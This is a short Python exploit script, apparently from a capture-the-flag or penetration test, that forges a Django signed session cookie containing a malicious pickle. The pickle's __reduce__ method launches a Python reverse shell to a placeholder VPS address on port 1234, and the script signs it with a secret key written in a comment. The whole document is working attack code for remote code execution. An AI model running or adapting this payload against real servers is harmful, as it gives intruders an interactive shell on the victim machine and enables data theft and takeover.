#!python
import os
import subprocess
import pickle
from django.core import signing
from django.contrib.sessions.serializers import PickleSerializer

os.environ.setdefault("DJANGO_SETTINGS_MODULE", "settings")
# SECRET_KEY='77m6p#v&(wk_s2+n5na-bqe!m)^zu)9typ#0c&@qd%8o6!'
class Exploit(object):
  def __reduce__(self):
    return (subprocess.Popen, (
      ("""python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<vps_ip>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' &"""),
      0, # Bufsize
      None, # exec
      None, #stdin
      None, #stdout
      None, #stderr
      None, #preexec
      False, #close_fds
      True, # shell
      ))

#pickle.loads(pickle.dumps(Exploit()))

print (signing.dumps(Exploit(),
    salt='django.contrib.sessions.backends.signed_cookies',
    serializer=PickleSerializer,
    compress=True))